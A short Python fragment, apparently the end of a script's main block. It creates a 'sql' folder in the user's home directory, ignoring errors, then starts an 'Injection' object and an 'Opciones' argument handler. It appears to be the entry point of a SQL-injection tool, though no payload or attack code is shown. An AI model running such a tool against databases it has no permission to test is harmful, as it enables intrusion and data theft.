			p = getenv("HOME")+"/sql/"
			mkdir(p)
		except:
			pass
	inject = Injection()
	Opciones(argv)
